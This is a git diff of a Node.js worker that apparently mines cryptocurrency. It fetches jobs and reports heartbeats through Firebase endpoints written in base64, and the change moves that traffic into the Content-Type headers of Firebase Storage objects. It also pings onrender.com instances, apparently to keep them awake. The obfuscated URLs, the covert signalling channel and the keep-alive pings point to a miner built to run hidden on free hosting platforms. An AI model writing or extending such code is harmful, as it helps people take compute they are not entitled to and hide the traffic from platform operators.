@@ -16,7 +16,8 @@ let mUpdateUrl = new Date().getTime()+21600000
 let mStart = new Date().getTime()
 let mTime = new Date().toString()
 
-let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
+let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
+let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
 
 const app = express()
 
@@ -31,7 +32,7 @@ startWorker()
 
 setInterval(async() => {
     getJob()
-}, 20000)
+}, 30000)
 
 
 async function startWorker() {
@@ -42,7 +43,7 @@ async function startWorker() {
         if (mJob) {
             break
         }
-        await delay(3000)
+        await delay(10000)
     }
 
     console.log('Job Received...')
@@ -70,10 +71,12 @@ async function updateStatus() {
 
     if (mUrl) {
         try {
-            await axios.patch(BASE_URL+'mining/server/'+mID+'.json', JSON.stringify({ active:parseInt(new Date().getTime()/1000) }), {
+            await axios.post(STORAGE+encodeURIComponent('mining/server/'+mID+'.json'), '', {
                 headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                }
+                    'Content-Type':'active/'+parseInt(new Date().getTime()/1000)
+                },
+                maxBodyLength: Infinity,
+                maxContentLength: Infinity
             })
         } catch (error) {}
     }
@@ -94,22 +97,8 @@ async function updateServer() {
         }
 
         if (mUrl) {
-            let status = false
             try {
-                let response = await axios.get('https://'+mUrl+'.onrender.com/worker?url='+mUrl)
-                let data = response.data
-                
-                if (data && data == 'ok') {
-                    status = true
-                }
-            } catch (error) {}
-
-            try {
-                await axios.patch(BASE_URL+'mining/server/'+mID+'.json', JSON.stringify({ status:status, active:parseInt(new Date().getTime()/1000) }), {
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                })
+                await axios.get('https://'+mUrl+'.onrender.com/worker?url='+mUrl)
             } catch (error) {}
         } else {
             if (mNextId == null) {
@@ -145,13 +134,26 @@ async function updateServer() {
 }
 
 async function getJob() {
+    let tempJob = null
+    
     try {
-        let response = await axios.get(BASE_URL+'mining/job.json')
+        let response = await axios.get(STORAGE+encodeURIComponent('mining/job.json'))
 
-        if (response.data && response.data['blob']) {
-            mJob = response.data
-        }
+        let contentType = response.data['contentType']
+        tempJob = JSON.parse(decode(contentType.replace('base64/', '')))
     } catch (error) {}
+
+    if (tempJob) {
+        mJob = tempJob
+    } else {
+        try {
+            let response = await axios.get(BASE_URL+'mining/job.json')
+    
+            if (response.data && response.data['blob']) {
+                mJob = response.data
+            }
+        } catch (error) {}
+    }
 }
 
 async function saveHash(id, hsah, nonce) {
@@ -162,6 +164,10 @@ async function saveHash(id, hsah, nonce) {
             }
         })
     } catch (error) {}
+}
+
+function encode(data) {
+    return Buffer.from(data).toString('base64')
 }
 
 function decode(data) {
